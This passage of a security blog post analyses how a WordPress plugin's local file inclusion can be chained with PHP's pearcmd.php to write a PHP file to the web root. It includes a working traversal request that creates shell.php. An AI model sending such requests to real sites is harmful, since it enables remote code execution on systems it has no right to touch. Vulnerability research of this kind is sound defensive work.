+</span></span><span class="line"><span class="cl">    <span class="nv">$data</span> <span class="o">=</span> <span class="p">(</span><span class="nv">$data</span> <span class="o">===</span> <span class="k">null</span><span class="p">)</span> <span class="o">?</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">configuration</span><span class="p">[</span><span class="nv">$layer</span><span class="p">]</span> <span class="o">:</span> <span class="nv">$data</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">_encodeOutput</span><span class="p">(</span><span class="nv">$data</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$opt</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s1">&#39;-p&#39;</span><span class="p">,</span> <span class="nx">dirname</span><span class="p">(</span><span class="nv">$file</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="o">!@</span><span class="nx">System</span><span class="o">::</span><span class="na">mkDir</span><span class="p">(</span><span class="nv">$opt</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">raiseError</span><span class="p">(</span><span class="s2">&#34;could not create directory: &#34;</span> <span class="o">.</span> <span class="nx">dirname</span><span class="p">(</span><span class="nv">$file</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nx">file_exists</span><span class="p">(</span><span class="nv">$file</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nx">is_file</span><span class="p">(</span><span class="nv">$file</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="nx">is_writeable</span><span class="p">(</span><span class="nv">$file</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">raiseError</span><span class="p">(</span><span class="s2">&#34;no write access to </span><span class="si">$file</span><span class="s2">!&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nv">$fp</span> <span class="o">=</span> <span class="o">@</span><span class="nx">fopen</span><span class="p">(</span><span class="nv">$file</span><span class="p">,</span> <span class="s2">&#34;w&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$fp</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">raiseError</span><span class="p">(</span><span class="s2">&#34;PEAR_Config::writeConfigFile fopen(&#39;</span><span class="si">$file</span><span class="s2">&#39;,&#39;w&#39;) failed (</span><span class="si">$php_errormsg</span><span class="s2">)&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line hl"><span class="cl">    <span class="nv">$contents</span> <span class="o">=</span> <span class="s2">&#34;#PEAR_Config 0.9</span><span class="se">\n</span><span class="s2">&#34;</span> <span class="o">.</span> <span class="nx">serialize</span><span class="p">(</span><span class="nv">$data</span><span class="p">);</span>
+</span></span><span class="line hl"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="o">!@</span><span class="nx">fwrite</span><span class="p">(</span><span class="nv">$fp</span><span class="p">,</span> <span class="nv">$contents</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line hl"><span class="cl">        <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">raiseError</span><span class="p">(</span><span class="s2">&#34;PEAR_Config::writeConfigFile: fwrite failed (</span><span class="si">$php_errormsg</span><span class="s2">)&#34;</span><span class="p">);</span>
+</span></span><span class="line hl"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="k">true</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>This function is the one that writes the config file by <code>serialize($data)</code> to convert the configuration into a storable string.</p>
+<p>Back in <code>pearcmd.php</code>, the params are prepared and assigned to <code>$params</code>.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">list</span><span class="p">(</span><span class="nv">$tmpopt</span><span class="p">,</span> <span class="nv">$params</span><span class="p">)</span> <span class="o">=</span> <span class="nv">$tmp</span><span class="p">;</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><figure><a class="lightgallery" href="/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/params.png" title="Value of $params in the debugger" data-thumbnail="/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/params.png" data-sub-html="<h2>params</h2><p>Value of $params in the debugger</p>"><img loading="lazy" src='/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/params.png' alt="params" height="244" width="1634"></a><figcaption class="image-caption">Value of $params in the debugger</figcaption>
+  </figure></p>
+<p>Finally, <code>$cmd</code> is executed via <code>$cmd-&gt;run()</code>:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$ok</span> <span class="o">=</span> <span class="nv">$cmd</span><span class="o">-&gt;</span><span class="na">run</span><span class="p">(</span><span class="nv">$command</span><span class="p">,</span> <span class="nv">$opts</span><span class="p">,</span> <span class="nv">$params</span><span class="p">);</span></span></span></code></pre></td></tr></table>
+</div>
+</div><h2 class="heading-element" id="flow"><span>Flow</span>
+  <a href="#flow" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><ol>
+<li>Send a GET request:</li>
+</ol>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="line"><span class="cl"><span class="err">GET /wp-admin/admin-ajax.php?action=geo_mashup_query&amp;object_ids=2&amp;template=../../../../../../../usr/local/lib/php/pearcmd&amp;+config-create+/test_root_path+test_filename.php</span></span></span></code></pre></td></tr></table>
+</div>
+</div><ol start="2">
+<li>
+<p>The web app <code>include</code>s <code>/usr/local/lib/php/pearcmd.php</code>.</p>
+</li>
+<li>
+<p>PHP (with register_argc_argv=On) builds <code>$_SERVER['argv']</code> from the query → <code>['action=geo_mashup_query&amp;object_ids=2&amp;template=../../../../../../../usr/local/lib/php/pearcmd&amp;','config-create','/test_root_path','test_filename.php']</code>.</p>
+</li>
+<li>
+<p><code>Console_Getopt::readPHPArgv()</code> returns <code>$argv</code>; <code>Console_Getopt::getopt2()</code> parses and yields <code>$command='config-create'</code> and <code>list($tmpopt, $params)</code> gives <code>$params=['/test_root_path','test_filename.php']</code>.</p>
+</li>
+<li>
+<p><code>doConfigCreate()</code> runs with <code>$params</code> controlled by the attacker → <code>touch()</code>/<code>realpath()</code> and <code>writeConfigFile()</code> create/write the file.</p>
+</li>
+</ol>
+<div class="details admonition info open disabled">
+  <div class="details-summary admonition-title"><i class="icon fa-fw fa-solid fa-circle-info" aria-hidden="true"></i>Info</div>
+  <div class="details-content">
+    <div class="admonition-content"><p>The created config file contains the <code>root path</code> value. If this value is written as a valid PHP tag (<code>&lt;?php ... ?&gt;</code>) and the file is accessible by the client, the webserver will process the PHP content in that file and the code will be executed, leading to <strong>RCE</strong>.</p></div>
+  </div>
+</div><h2 class="heading-element" id="exploit"><span>Exploit</span>
+  <a href="#exploit" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p>Leveraging <a href="https://w41bu1.github.io/2025-10-13-cve-2025-48293/"target="_blank" rel="external nofollow noopener noreferrer">CVE-2025-48293</a> analyzed earlier to expand into an exploit via <code>pearcmd.php</code></p>
+<p>Send a request with an LFI payload pointing to <code>pearcmd.php</code>:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="line"><span class="cl"><span class="nf">GET</span> <span class="nn">/wp-admin/admin-ajax.php?action=geo_mashup_query&amp;object_ids=2&amp;template=../../../../../../../usr/local/lib/php/pearcmd&amp;+config-create+/&lt;?=phpinfo();?&gt;+/var/www/html/shell.php</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+</span></span><span class="line"><span class="cl"><span class="n">Host</span><span class="o">:</span> <span class="l">localhost</span>
+</span></span><span class="line"><span class="cl"><span class="n">User-Agent</span><span class="o">:</span> <span class="l">Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:144.0) Gecko/20100101 Firefox/144.0</span>
+</span></span><span class="line"><span class="cl"><span class="n">Accept</span><span class="o">:</span> <span class="l">text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span>
+</span></span><span class="line"><span class="cl"><span class="n">Accept-Language</span><span class="o">:</span> <span class="l">en-US,en;q=0.5</span>
+</span></span><span class="line"><span class="cl"><span class="n">Accept-Encoding</span><span class="o">:</span> <span class="l">gzip, deflate, br</span>
+</span></span><span class="line"><span class="cl"><span class="n">Referer</span><span class="o">:</span> <span class="l">http://localhost/wp-admin/</span>
+</span></span><span class="line"><span class="cl"><span class="n">Connection</span><span class="o">:</span> <span class="l">keep-alive</span>
+</span></span><span class="line"><span class="cl"><span class="n">Upgrade-Insecure-Requests</span><span class="o">:</span> <span class="l">1</span>
+</span></span><span class="line"><span class="cl"><span class="n">Sec-Fetch-Dest</span><span class="o">:</span> <span class="l">document</span>
+</span></span><span class="line"><span class="cl"><span class="n">Sec-Fetch-Mode</span><span class="o">:</span> <span class="l">navigate</span>
+</span></span><span class="line"><span class="cl"><span class="n">Sec-Fetch-Site</span><span class="o">:</span> <span class="l">same-origin</span>
+</span></span><span class="line"><span class="cl"><span class="n">Sec-Fetch-User</span><span class="o">:</span> <span class="l">?1</span>
+</span></span><span class="line"><span class="cl"><span class="n">X-PwnFox-Color</span><span class="o">:</span> <span class="l">blue</span>
+</span></span><span class="line"><span class="cl"><span class="n">Priority</span><span class="o">:</span> <span class="l">u=0, i</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>Successful response returned</strong>:</p>
+<p><figure><a class="lightgallery" href="/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/res2.png" title="Successful response" data-thumbnail="/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/res2.png" data-sub-html="<h2>res2</h2><p>Successful response</p>"><img loading="lazy" src='/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/res2.png' alt="res2" height="937" width="1536"></a><figcaption class="image-caption">Successful response</figcaption>
+  </figure></p>
+<p>Accessing <code>shell.php</code>:</p>
+<p><figure><a class="lightgallery" href="/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/shell.png" title="shell.php" data-thumbnail="/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/shell.png" data-sub-html="<h2>shell</h2><p>shell.php</p>"><img loading="lazy" src='/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/shell.png' alt="shell" height="1078" width="1919"></a><figcaption class="image-caption">shell.php</figcaption>
+  </figure></p></div><hr class="awesome-hr" />
+    <h2 id="see-also">Related Content</h2>
+    <ul><li>
+          <a href="/posts/2025-10-21-cve-2025-32141/" title="CVE-2025-32141 Analysis &amp; POC">CVE-2025-32141 Analysis &amp; POC</a></li><li>
+          <a href="/posts/2025-10-20-cve-2025-52716/" title="CVE-2025-52716 Analysis &amp; POC">CVE-2025-52716 Analysis &amp; POC</a></li><li>
+          <a href="/posts/2025-10-19-cve-2025-6715/" title="CVE-2025-6715 Analysis &amp; POC">CVE-2025-6715 Analysis &amp; POC</a></li><li>
+          <a href="/posts/2025-10-18-cve-2025-26909/" title="CVE-2025-26909 Analysis &amp; POC">CVE-2025-26909 Analysis &amp; POC</a></li><li>
+          <a href="/posts/2025-10-17-cve-2025-39399/" title="CVE-2025-39399 Analysis &amp; POC">CVE-2025-39399 Analysis &amp; POC</a></li><li>
+          <a href="/posts/2025-10-16-cve-2025-30782/" title="CVE-2025-30782 Analysis &amp; POC">CVE-2025-30782 Analysis &amp; POC</a></li><li>
+          <a href="/posts/2025-10-15-cve-2025-30868/" title="CVE-2025-30868 Analysis &amp; POC">CVE-2025-30868 Analysis &amp; POC</a></li><li>
+          <a href="/posts/2025-10-14-cve-2025-32654/" title="CVE-2025-32654 Analysis &amp; POC">CVE-2025-32654 Analysis &amp; POC</a></li><li>
+          <a href="/posts/2025-10-13-cve-2025-48293/" title="CVE-2025-48293 Analysis &amp; POC">CVE-2025-48293 Analysis &amp; POC</a></li><li>
+          <a href="/posts/2025-10-12-cve-2025-53328/" title="CVE-2025-53328 Analysis &amp; POC">CVE-2025-53328 Analysis &amp; POC</a></li></ul><div class="post-footer" id="post-footer">
+  <div class="post-info">
+    <div class="post-info-line">
+      <div class="post-info-mod"><span title="Updated on 2025-10-22 20:48:00">Updated on 2025-10-22&nbsp;</span>
+      </div><div class="post-info-license">
+            <span><a rel="license external nofollow noopener noreferrer" href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a></span>
+          </div></div><div class="post-info-line">
+        <div class="post-info-md"><span><a href="/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/index.md" title="Read Markdown" class="link-to-markdown">Read Markdown</a></span><span><a href="https://github.com/w41bu1/w41bu1.github.io/blob/main/content/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/index.en.md?plain=1" title="View source"target="_blank" rel="external nofollow noopener noreferrer" class="link-to-source">View source</a></span><span><a href="https://github.com/w41bu1/w41bu1.github.io/edit/main/content/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/index.en.md" title="Edit this page"target="_blank" rel="external nofollow noopener noreferrer" class="link-to-edit">Edit this page</a></span><span><a href="https://github.com/w41bu1/w41bu1.github.io/issues/new?title=[BUG]%20Exploiting&#43;LFI2RCE&#43;Vulnerability&#43;via&#43;PHP&#43;PEARCMD&amp;body=%7cField%7cValue%7c%0A%7c-%7c-%7c%0A%7cTitle%7cExploiting&#43;LFI2RCE&#43;Vulnerability&#43;via&#43;PHP&#43;PEARCMD%7c%0A%7cURL%7chttp://localhost:1313/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/%7c%0A%7cFilename%7chttps://github.com/w41bu1/w41bu1.github.io/blob/main/content/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/index.en.md?plain=1%7c" title="Report issue"target="_blank" rel="external nofollow noopener noreferrer" class="link-to-report">Report issue</a></span><span><a href="vscode://file//home/w41bu1/Desktop/w41bu1.github.io/content/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/index.en.md" title="Open in editor"target="_blank" rel="external nofollow noopener noreferrer" class="link-to-vscode">Open in editor</a></span></div>
+        <div class="post-info-share">
+          <span><a href="javascript:void(0);" title="Share on X" data-sharer="twitter" data-url="http://localhost:1313/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/" data-title="Exploiting LFI2RCE Vulnerability via PHP PEARCMD" data-hashtags="analyst,lfi,plugin,pearcmd"><i class="fa-brands fa-x-twitter fa-fw" aria-hidden="true"></i></a>
+  <a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="http://localhost:1313/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/" data-hashtag="analyst"><i class="fa-brands fa-facebook-square fa-fw" aria-hidden="true"></i></a>
+  <a href="javascript:void(0);" title="Share on Linkedin" data-sharer="linkedin" data-url="http://localhost:1313/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/"><i class="fa-brands fa-linkedin fa-fw" aria-hidden="true"></i></a>
+  <a href="javascript:void(0);" title="Share on Hacker News" data-sharer="hackernews" data-url="http://localhost:1313/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/" data-title="Exploiting LFI2RCE Vulnerability via PHP PEARCMD"><i class="fa-brands fa-hacker-news fa-fw" aria-hidden="true"></i></a>
+  </span>
+        </div>
+      </div></div>
+
+  <div class="post-info-more">
+    <section class="post-tags"><i class="fa-solid fa-tags fa-fw me-1" aria-hidden="true"></i><a href="/tags/analyst/" class="post-tag" title="Tags - Analyst">Analyst</a><a href="/tags/lfi/" class="post-tag" title="Tags - Lfi">Lfi</a><a href="/tags/plugin/" class="post-tag" title="Tags - Plugin">Plugin</a><a href="/tags/pearcmd/" class="post-tag" title="Tags - Pearcmd">Pearcmd</a></section>
+    <section><span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+    </section>
+  </div><div class="post-nav"><a href="/posts/2025-10-22-cve-2025-11361/" class="post-nav-item" rel="prev" title="CVE-2025-11361 Analysis &amp; POC"><i class="fa-solid fa-angle-left fa-fw" aria-hidden="true"></i>CVE-2025-11361 Analysis &amp; POC</a><a href="/posts/2025-10-23-cve-2023-36679/" class="post-nav-item" rel="next" title="CVE-2023-36679 Analysis &amp; POC">CVE-2023-36679 Analysis &amp; POC<i class="fa-solid fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+</article>
+
+  <aside class="toc" id="toc-auto" aria-label="Contents"><h2 class="toc-title">Contents&nbsp;<i class="toc-icon fa-solid fa-angle-down fa-fw" aria-hidden="true"></i></h2>
+      <div class="toc-content always-active" id="toc-content-auto"></div></aside></main><footer class="footer">
+    <div class="footer-container"><div class="footer-line powered">Powered by <a href="https://gohugo.io/" target="_blank" rel="external nofollow noopener noreferrer" title="Hugo 0.152.2"><img class="hugo-icon" src="/images/hugo.min.svg" alt="Hugo logo" /> Hugo</a> | Theme - <a href="https://github.com/hugo-fixit/FixIt" target="_blank" rel="external" title="FixIt v0.4.0-alpha.2-20251023040336-063af2cd"><img class="fixit-icon" src="/images/fixit.min.svg" alt="FixIt logo" /> FixIt</a>
+        </div><div class="footer-line copyright" itemscope itemtype="http://schema.org/CreativeWork"><i class="fa-regular fa-copyright fa-fw" aria-hidden="true"></i>
+            <span itemprop="copyrightYear">2025</span><span class="author" itemprop="copyrightHolder">
+              <a href="github.com/w41bu1">Bui Van Y</a></span></div><div class="footer-line statistics"></div><div class="footer-line visitor">
+          <span id="busuanzi_container_site_uv" title='Total visitors'><i class="fa-regular fa-user fa-fw me-1" aria-hidden="true"></i><span id="busuanzi_value_site_uv"><i class="fa-solid fa-spinner fa-spin fa-fw" aria-hidden="true"></i></span></span><span id="busuanzi_container_site_pv" class="footer-divider" title='Total visits'><i class="fa-regular fa-eye fa-fw me-1" aria-hidden="true"></i><span id="busuanzi_value_site_pv"><i class="fa-solid fa-spinner fa-spin fa-fw" aria-hidden="true"></i></span></span>
+        </div></div>
+  </footer></div><div class="widgets"><div class="fixed-buttons animate__faster d-none"><div class="fixed-button back-to-top" role="button" aria-label="Back to Top"><i class="fa-solid fa-arrow-up fa-fw" aria-hidden="true"></i><span class="variant-numeric">0%</span>
+        </div></div><div id="mask"></div><noscript>
+    <div class="noscript-warning">This website works best with JavaScript enabled.</div>
+  </noscript>
+</div><link rel="stylesheet" href="/lib/lightgallery/css/lightgallery-bundle.min.css"><link rel="stylesheet" href="/lib/pace/themes/blue/pace-theme-minimal.css"><script src="/lib/autocomplete/autocomplete.min.js" defer></script><script src="/lib/fuse/fuse.min.js" defer></script><script src="/lib/lightgallery/lightgallery.min.js" defer></script><script src="/lib/lightgallery/plugins/thumbnail/lg-thumbnail.min.js" defer></script><script src="/lib/lightgallery/plugins/zoom/lg-zoom.min.js" defer></script><script src="/lib/sharer/sharer.min.js" async defer></script><script src="/lib/cell-watermark/watermark.min.js" defer></script><script src="/lib/pace/pace.min.js" async defer></script><script src="/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/config/page.js" defer></script><script src="/js/theme.min.js" defer></script></body>
+</html>
